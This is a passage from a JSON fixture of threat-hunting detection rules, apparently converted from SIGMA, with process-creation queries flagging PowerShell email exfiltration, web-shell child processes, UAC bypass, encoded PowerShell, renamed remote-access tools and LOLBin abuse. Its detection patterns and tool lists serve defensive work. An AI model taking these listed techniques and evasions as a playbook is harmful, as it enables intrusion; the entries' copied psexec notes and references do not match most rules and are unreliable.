tgt.process.cmdline contains \"6ADoAKAAnAEwAbwBhACcAKwAnAGQAJwApA\")) | columns tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 116
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects email exfiltration via powershell cmdlets",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Email Exifiltration Via Powershell",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and (tgt.process.cmdline contains \"Add-PSSnapin\" and tgt.process.cmdline contains \"Get-Recipient\" and tgt.process.cmdline contains \"-ExpandProperty\" and tgt.process.cmdline contains \"EmailAddresses\" and tgt.process.cmdline contains \"SmtpAddress\" and tgt.process.cmdline contains \"-hidetableheaders\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 117
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - GoToAssist Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.displayName=\"GoTo Opener\" or tgt.process.displayName=\"GoTo Opener\" or tgt.process.publisher=\"LogMeIn, Inc.\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 118
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious processes being spawned by a web server process which could be the result of a successfully placed web shell or exploitation\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1505",
                "t1190"
            ],
            "name": "Suspicious Process By Web Server Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\caddy.exe\" or src.process.image.path contains \"\\httpd.exe\" or src.process.image.path contains \"\\nginx.exe\" or src.process.image.path contains \"\\php-cgi.exe\" or src.process.image.path contains \"\\php.exe\" or src.process.image.path contains \"\\tomcat.exe\" or src.process.image.path contains \"\\UMWorkerProcess.exe\" or src.process.image.path contains \"\\w3wp.exe\" or src.process.image.path contains \"\\ws_TomcatService.exe\") or ((src.process.image.path contains \"\\java.exe\" or src.process.image.path contains \"\\javaw.exe\") and (src.process.image.path contains \"-tomcat-\" or src.process.image.path contains \"\\tomcat\")) or ((src.process.image.path contains \"\\java.exe\" or src.process.image.path contains \"\\javaw.exe\") and (src.process.cmdline contains \"CATALINA_HOME\" or src.process.cmdline contains \"catalina.home\" or src.process.cmdline contains \"catalina.jar\"))) and (tgt.process.image.path contains \"\\arp.exe\" or tgt.process.image.path contains \"\\at.exe\" or tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\dsget.exe\" or tgt.process.image.path contains \"\\hostname.exe\" or tgt.process.image.path contains \"\\nbtstat.exe\" or tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\" or tgt.process.image.path contains \"\\netdom.exe\" or tgt.process.image.path contains \"\\netsh.exe\" or tgt.process.image.path contains \"\\nltest.exe\" or tgt.process.image.path contains \"\\ntdsutil.exe\" or tgt.process.image.path contains \"\\powershell_ise.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\qprocess.exe\" or tgt.process.image.path contains \"\\query.exe\" or tgt.process.image.path contains \"\\qwinsta.exe\" or tgt.process.image.path contains \"\\reg.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\sc.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\wusa.exe\") and (not ((src.process.image.path contains \"\\java.exe\" and tgt.process.cmdline contains \"Windows\\system32\\cmd.exe /c C:\\ManageEngine\\ADManager \\\"Plus\\ES\\bin\\elasticsearch.bat -Enode.name=RMP-NODE1 -pelasticsearch-pid.txt\") or (src.process.image.path contains \"\\java.exe\" and (tgt.process.cmdline contains \"sc query\" and tgt.process.cmdline contains \"ADManager Plus\"))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 119
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the LOLBIN PrintBrm.exe, which can be used to create or extract ZIP files. PrintBrm.exe should not be run on a normal workstation.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105",
                "t1564"
            ],
            "name": "PrintBrm ZIP Creation of Extraction",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\PrintBrm.exe\" and (tgt.process.cmdline contains \" -f\" and tgt.process.cmdline contains \".zip\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 120
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the expansion or decompression of cabinet files from potentially suspicious or uncommon locations, e.g. seen in Iranian MeteorExpress related attacks",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potentially Suspicious Cabinet File Expansion",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\expand.exe\" and (tgt.process.cmdline contains \"-F:\" or tgt.process.cmdline contains \"/F:\" or tgt.process.cmdline contains \"\u2013F:\" or tgt.process.cmdline contains \"\u2014F:\" or tgt.process.cmdline contains \"\u2015F:\")) and ((tgt.process.cmdline contains \":\\Perflogs\\\" or tgt.process.cmdline contains \":\\ProgramData\" or tgt.process.cmdline contains \":\\Users\\Public\\\" or tgt.process.cmdline contains \":\\Windows\\Temp\\\" or tgt.process.cmdline contains \"\\Admin$\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\" or tgt.process.cmdline contains \"\\AppData\\Roaming\\\" or tgt.process.cmdline contains \"\\C$\\\" or tgt.process.cmdline contains \"\\Temporary Internet\") or ((tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\Favorites\\\") or (tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\Favourites\\\") or (tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\Contacts\\\"))) and (not (src.process.image.path=\"C:\\Program Files (x86)\\Dell\\UpdateService\\ServiceShell.exe\" and tgt.process.cmdline contains \"C:\\ProgramData\\Dell\\UpdateService\\Temp\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 121
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using pkgmgr.exe and dism.exe (UACMe 23)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using PkgMgr and DISM",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\pkgmgr.exe\" and tgt.process.image.path contains \"\\dism.exe\" and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 122
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - Anydesk Execution From Suspicious Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\AnyDesk.exe\" or tgt.process.displayName=\"AnyDesk\" or tgt.process.displayName=\"AnyDesk\" or tgt.process.publisher=\"AnyDesk Software GmbH\") and (not (tgt.process.image.path contains \"\\AppData\\\" or tgt.process.image.path contains \"Program Files (x86)\\AnyDesk\" or tgt.process.image.path contains \"Program Files\\AnyDesk\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 123
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious powershell execution via a schedule task where the command ends with an suspicious flags to hide the powershell instance instead of executeing scripts or commands. This could be a sign of persistence via PowerShell \"Get-Variable\" technique as seen being used in Colibri Loader",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053",
                "t1059"
            ],
            "name": "Potential Persistence Via Powershell Search Order Hijacking - Task",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path=\"C:\\WINDOWS\\System32\\svchost.exe\" and (src.process.cmdline contains \"-k netsvcs\" and src.process.cmdline contains \"-s Schedule\") and (tgt.process.cmdline contains \" -windowstyle hidden\" or tgt.process.cmdline contains \" -w hidden\" or tgt.process.cmdline contains \" -ep bypass\" or tgt.process.cmdline contains \" -noni\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 124
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects successful code compilation via Visual Basic Command Line Compiler that utilizes Windows Resource to Object Converter.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027"
            ],
            "name": "Visual Basic Command Line Compiler Usage",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\vbc.exe\" and tgt.process.image.path contains \"\\cvtres.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 125
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the \"FromBase64String\" function in the commandline which is used to decode a base64 encoded string",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1140",
                "t1059"
            ],
            "name": "Base64 Encoded PowerShell Command Detected",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"::FromBase64String(\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 126
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an uncommon parent process of \"LINK.EXE\".\nLink.EXE in Microsoft incremental linker. Its a utility usually bundled with Visual Studio installation.\nMultiple utilities often found in the same folder (editbin.exe, dumpbin.exe, lib.exe, etc) have a hardcode call to the \"LINK.EXE\" binary without checking its validity.\nThis would allow an attacker to sideload any binary with the name \"link.exe\" if one of the aforementioned tools get executed from a different location.\nBy filtering the known locations of such utilities we can spot uncommon parent process of LINK.EXE that might be suspicious or malicious.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Uncommon Link.EXE Parent Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\link.exe\" and tgt.process.cmdline contains \"LINK /\") and (not ((src.process.image.path contains \"C:\\Program Files\\Microsoft Visual Studio\\\" or src.process.image.path contains \"C:\\Program Files (x86)\\Microsoft Visual Studio\\\") and (src.process.image.path contains \"\\VC\\bin\\\" or src.process.image.path contains \"\\VC\\Tools\\\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 127
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of renamed Remote Utilities (RURAT) via Product PE header field",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Renamed Remote Utilities RAT (RURAT) Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.displayName=\"Remote Utilities\" and (not (tgt.process.image.path contains \"\\rutserv.exe\" or tgt.process.image.path contains \"\\rfusclient.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 128
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious call to the \"ShellExec_RunDLL\" exported function of SHELL32.DLL through the ordinal number to launch other commands.\nAdversary might only use the ordinal number in order to bypass existing detection that alert on usage of ShellExec_RunDLL on CommandLine.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Suspicious ShellExec_RunDLL Call Via Ordinal",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.cmdline contains \"SHELL32.DLL\" and (src.process.cmdline contains \"#568\" or src.process.cmdline contains \"#570\" or src.process.cmdline contains \"#572\" or src.process.cmdline contains \"#576\")) and (((src.process.cmdline contains \"comspec\" or src.process.cmdline contains \"iex\" or src.process.cmdline contains \"Invoke-\" or src.process.cmdline contains \"msiexec\" or src.process.cmdline contains \"odbcconf\" or src.process.cmdline contains \"regsvr32\") or (src.process.cmdline contains \"\\Desktop\\\" or src.process.cmdline contains \"\\ProgramData\\\" or src.process.cmdline contains \"\\Temp\\\" or src.process.cmdline contains \"\\Users\\Public\\\")) or (tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\curl.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\msiexec.exe\" or tgt.process.image.path contains \"\\msxsl.exe\" or tgt.process.image.path contains \"\\odbcconf.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\wscript.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 129
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect attacker collecting audio via SoundRecorder application.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1123"
            ],
            "name": "Audio Capture via SoundRecorder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\SoundRecorder.exe\" and tgt.process.cmdline contains \"/FILE\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 130
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "The Devtoolslauncher.exe executes other binary",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Devtoolslauncher.exe Executes Specified Binary",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
